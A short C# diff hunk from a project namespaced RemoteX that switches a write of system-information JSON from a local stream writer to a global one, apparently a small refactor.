@@ -376,7 +376,7 @@ namespace RemoteX
             String json_sys_info = MyDictionaryToJson(G_SystemInfo);
             if (json_sys_info != null)
             {
-                streamwriter.WriteLine(json_sys_info);
+                G_streamwriter.WriteLine(json_sys_info);
             }
 
         }
